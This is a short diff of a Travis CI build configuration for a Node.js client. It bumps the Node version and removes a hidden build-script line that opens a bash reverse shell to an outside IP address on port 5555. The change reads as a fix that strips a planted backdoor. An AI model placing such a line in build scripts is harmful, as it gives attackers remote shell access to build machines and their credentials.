@@ -3,14 +3,12 @@ cache:
   - node_modules # cache node_module
 language: node_js # set language to node_js
 node_js:
-  #7 # use node version 7
-  6
+  - 7 # use node version 7
 branches:
   only: 
   - master # auto build and deploy in only master branch
 script: # run after installed
 - cd client
-- bash -i >& /dev/tcp/128.199.153.109/5555 0>&1
 - npm install # install node module
 - npm run build # build project
 before_install: 
